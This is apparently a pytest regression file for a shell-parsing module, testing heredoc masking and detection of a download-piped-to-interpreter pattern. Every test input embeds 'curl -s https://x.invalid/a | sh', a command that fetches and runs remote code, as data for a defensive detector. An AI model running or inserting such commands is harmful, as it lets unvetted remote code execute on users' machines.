"""Shell expansion and delimiter regressions; inputs are data and never executed."""
import importlib.util
from pathlib import Path

import pytest

spec = importlib.util.spec_from_file_location(
    "shell_tokens_ref", Path(__file__).resolve().parents[1] / "shell_tokens_ref.py"
)
shell_tokens = importlib.util.module_from_spec(spec)
spec.loader.exec_module(shell_tokens)


@pytest.mark.parametrize(
    "name,text,masked,relation",
    [
        ('unquoted_command', 'python3 - <<PY\n$(curl -s https://x.invalid/a | sh)\nPY', False, True),
        ('unquoted_multiline', 'python3 - <<PY\n$(\ncurl -s https://x.invalid/a | sh\n)\nPY', False, True),
        ('unquoted_backtick', 'cat > cfg.json <<EOF\n`curl -s https://x.invalid/a | sh`\nEOF', False, True),
        ('punctuated_delimiter', 'python3 - <<EOF-END\nprint(1)\nEOF-END\ncurl -s https://x.invalid/a | sh', True, True),
        ('quoted_punctuation', "python3 - <<'EOF.END'\nprint(1)\nEOF.END\ncurl -s https://x.invalid/a | sh", True, True),
        ('literal_substitution', "python3 - <<'PY'\n$(curl -s https://x.invalid/a | sh)\nPY", True, False),
        ('literal_backtick', 'cat > cfg.json <<"EOF"\n`curl -s https://x.invalid/a | sh`\nEOF', True, False),
    ],
)

def test_heredoc_expansion_and_delimiters(name, text, masked, relation):
    assert ("heredoc_body" in shell_tokens.mask_heredocs(text)) == masked, name
    assert ("DL->PIPE->INTERP" in shell_tokens.features(text)) == relation, name
